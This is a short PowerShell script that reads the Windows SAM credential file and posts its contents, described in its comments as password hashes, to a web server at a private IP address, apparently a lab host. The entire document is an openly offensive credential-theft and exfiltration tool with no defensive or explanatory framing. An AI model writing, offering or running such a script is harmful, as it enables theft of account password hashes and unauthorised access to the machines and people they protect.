# Path to our SAM-File
$file_path = "C:\Windows\System32\config\SAM"

# URL of the webserver where we want to send the data
$url = "http://192.168.122.1:3000/upload"

# Function to extract password hashes and send them to the web server
function Extract-And-Send-PasswordHashes {
    try {
        # Read the content of the SAM file
        $content = Get-Content -Path $file_path -Raw -ErrorAction Stop
        
        # Send the content to the specified web server
        Send-ContentToWebServer -Data $content
    } 
    catch {
        Write-Host "Error extracting or sending password hashes: $_"
    }
}

# Function to send content to the web server
function Send-ContentToWebServer {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Data
    )
    try {
        $webRequest = Invoke-WebRequest -Uri $url -Method Post -Body $Data -ErrorAction Stop
        if ($webRequest.StatusCode -eq 200) {
            Write-Host "Data sent successfully to web server"
        } else {
            Write-Host "Failed to send data to web server. Status code: $($webRequest.StatusCode)"
        }
    } 
    catch {
        Write-Host "Error sending data to web server: $_"
    }
}

# Call the function to extract and send password hashes
Extract-And-Send-PasswordHashes
